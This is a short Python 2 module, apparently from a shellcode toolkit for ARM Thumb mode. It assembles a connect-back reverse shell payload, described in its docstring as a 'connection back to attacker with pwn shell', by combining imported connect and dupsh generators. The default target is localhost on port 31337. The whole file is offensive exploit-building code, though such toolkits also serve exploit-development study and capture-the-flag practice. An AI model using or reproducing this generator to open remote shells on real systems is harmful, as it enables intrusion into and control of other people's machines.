# connection back

from socket import htons, inet_aton, gethostbyname
from struct import unpack

import connect
import dupsh


def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337, sock='r6'):
    """connection back to attacker with pwn shell on specific port in Thumb Mode

    argument:
        host (str)    : specific IP address or hostname
        port (int/str): specific port
        sock (int/str): sock descriptor for dupsh()
    """
    sc =  connect.generate(host, port)
    sc += dupsh.generate(sock)

    return sc    

if __name__ == '__main__':
    print generate()
